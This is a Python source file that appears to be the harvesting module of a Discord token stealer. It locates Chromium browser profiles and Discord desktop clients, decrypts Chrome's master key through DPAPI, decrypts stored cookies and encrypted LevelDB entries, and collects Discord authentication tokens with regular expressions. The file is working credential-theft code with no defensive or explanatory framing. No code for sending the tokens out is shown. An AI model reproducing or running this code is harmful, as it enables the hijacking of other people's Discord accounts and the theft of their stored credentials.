import os
import re
import json
import shutil
import sqlite3
import base64
import tempfile
from pathlib import Path
from typing import List, Dict

try:
    import win32crypt
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

try:
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


TOKEN_REGEX = re.compile(r"[\w-]{24,35}\.[\w-]{6}\.[\w-]{25,110}")
TOKEN_REGEX_ALT = re.compile(r"mfa\.[\w-]{84}")

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")


CHROMIUM_PATHS: Dict[str, str] = {
    "Chrome":    os.path.join(LOCAL,   "Google", "Chrome",       "User Data"),
    "Brave":     os.path.join(LOCAL,   "BraveSoftware", "Brave-Browser", "User Data"),
    "Edge":      os.path.join(LOCAL,   "Microsoft", "Edge",      "User Data"),
    "Opera":     os.path.join(ROAMING, "Opera Software", "Opera Stable"),
    "Opera GX":  os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
    "Vivaldi":   os.path.join(LOCAL,   "Vivaldi",        "User Data"),
    "Yandex":    os.path.join(LOCAL,   "Yandex",         "YandexBrowser", "User Data"),
    "Chromium":  os.path.join(LOCAL,   "Chromium",       "User Data"),
    "Slimjet":   os.path.join(LOCAL,   "Slimjet",        "User Data"),
    "CentBrowser": os.path.join(LOCAL, "CentBrowser",    "User Data"),
}

DISCORD_PATHS: Dict[str, str] = {
    "Discord":        os.path.join(ROAMING, "discord"),
    "Discord PTB":    os.path.join(ROAMING, "discordptb"),
    "Discord Canary": os.path.join(ROAMING, "discordcanary"),
    "Discord Dev":    os.path.join(ROAMING, "discorddevelopment"),
}




def _get_chrome_master_key(user_data_path: str) -> bytes | None:
    """Extract and decrypt Chrome's master AES key from Local State."""
    local_state_path = os.path.join(user_data_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)
        encrypted_key = encrypted_key[5:]
        if HAS_WIN32:
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
    except Exception:
        pass
    return None


def _decrypt_chrome_token(encrypted_value: bytes, master_key: bytes | None) -> str | None:
    """Decrypt a Chrome-encrypted token value."""
    try:
        if encrypted_value[:3] == b"v10" and master_key and HAS_CRYPTO:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode("utf-8")
        elif HAS_WIN32:
            result = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return result.decode("utf-8")
    except Exception:
        pass
    return None



def _scan_leveldb(path: str) -> List[str]:
    """Scan all .ldb / .log files in a LevelDB folder for token strings."""
    tokens: List[str] = []
    if not os.path.isdir(path):
        return tokens
    for fname in os.listdir(path):
        if not fname.endswith((".ldb", ".log")):
            continue
        fpath = os.path.join(path, fname)
        try:
            with open(fpath, "rb") as f:
                content = f.read().decode("utf-8", errors="ignore")
            tokens.extend(TOKEN_REGEX.findall(content))
            tokens.extend(TOKEN_REGEX_ALT.findall(content))
        except Exception:
            pass
    return tokens



def _scan_chrome_profile(profile_path: str, master_key: bytes | None) -> List[str]:
    """Extract tokens from a Chrome profile's local storage and cookies."""
    tokens: List[str] = []

    ls_path = os.path.join(profile_path, "Local Storage", "leveldb")
    tokens.extend(_scan_leveldb(ls_path))

    cookies_db = os.path.join(profile_path, "Network", "Cookies")
    if not os.path.exists(cookies_db):
        cookies_db = os.path.join(profile_path, "Cookies")

    if os.path.exists(cookies_db):
        try:
            tmp = tempfile.mktemp(suffix=".db")
            shutil.copy2(cookies_db, tmp)
            conn = sqlite3.connect(tmp)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name='token'"
            )
            for row in cursor.fetchall():
                encrypted = row[0]
                if isinstance(encrypted, bytes) and encrypted:
                    decrypted = _decrypt_chrome_token(encrypted, master_key)
                    if decrypted:
                        tokens.extend(TOKEN_REGEX.findall(decrypted))
            conn.close()
            os.remove(tmp)
        except Exception:
            pass

    return tokens



def scan_browsers(progress_callback=None) -> List[Dict]:
    """Scan all Chromium-based browsers for Discord tokens."""
    results: List[Dict] = []
    total = len(CHROMIUM_PATHS)

    for i, (name, user_data) in enumerate(CHROMIUM_PATHS.items()):
        if progress_callback:
            progress_callback(f"Scan {name}…", (i / total) * 0.5)

        if not os.path.isdir(user_data):
            continue

        master_key = _get_chrome_master_key(user_data)

        profiles = ["Default"] + [
            d for d in os.listdir(user_data)
            if d.startswith("Profile ") and os.path.isdir(os.path.join(user_data, d))
        ]

        for profile in profiles:
            profile_path = os.path.join(user_data, profile)
            if not os.path.isdir(profile_path):
                continue
            found = _scan_chrome_profile(profile_path, master_key)
            for token in set(found):
                if _is_valid_token(token):
                    results.append({
                        "token": token,
                        "source": name,
                        "profile": profile,
                    })

    return results


def _get_discord_master_key(discord_path: str) -> bytes | None:
    """Extract and decrypt Discord's master AES key from Local State."""
    local_state_path = os.path.join(discord_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)
        encrypted_key = encrypted_key[5:]
        if HAS_WIN32:
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
    except Exception:
        pass
    return None


def scan_discord_apps(progress_callback=None) -> List[Dict]:
    """Scan Discord desktop apps for stored tokens (now encrypted in Local Storage/leveldb)."""
    results: List[Dict] = []
    total = len(DISCORD_PATHS)

    for i, (name, discord_dir) in enumerate(DISCORD_PATHS.items()):
        if progress_callback:
            progress_callback(f"Scan {name}…", 0.5 + (i / total) * 0.45)

        leveldb_path = os.path.join(discord_dir, "Local Storage", "leveldb")
        if not os.path.isdir(leveldb_path):
            continue

        master_key = _get_discord_master_key(discord_dir)
        
        found = _scan_leveldb(leveldb_path)
        for token in set(found):
            if _is_valid_token(token):
                results.append({"token": token, "source": name, "profile": "App"})

        if master_key and HAS_CRYPTO:
            try:
                for fname in os.listdir(leveldb_path):
                    if not fname.endswith((".ldb", ".log")):
                        continue
                    fpath = os.path.join(leveldb_path, fname)
                    with open(fpath, "r", errors="ignore") as f:
                        lines = f.readlines()
                    for line in lines:
                        for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            encrypted_b64 = match.split("dQw4w9WgXcQ:")[1]
                            try:
                                encrypted_value = base64.b64decode(encrypted_b64)
                                decrypted = _decrypt_chrome_token(encrypted_value, master_key)
                                if decrypted and _is_valid_token(decrypted):
                                    results.append({
                                        "token": decrypted,
                                        "source": name,
                                        "profile": "App"
                                    })
                            except Exception:
                                pass
            except Exception:
                pass

    return results


def _is_valid_token(token: str) -> bool:
    """Basic sanity check — must match regex and have reasonable length."""
    if TOKEN_REGEX_ALT.match(token):
        return True
    parts = token.split(".")
    return len(parts) == 3 and len(token) >= 50


def scan_all(progress_callback=None) -> List[Dict]:
    """Run full scan: browsers + Discord apps. Returns deduplicated results."""
    all_results: List[Dict] = []

    browser_results = scan_browsers(progress_callback)
    all_results.extend(browser_results)

    discord_results = scan_discord_apps(progress_callback)
    all_results.extend(discord_results)

    if progress_callback:
        progress_callback("Finalisation…", 0.95)

    seen = set()
    unique = []
    for item in all_results:
        if item["token"] not in seen:
            seen.add(item["token"])
            unique.append(item)

    return unique
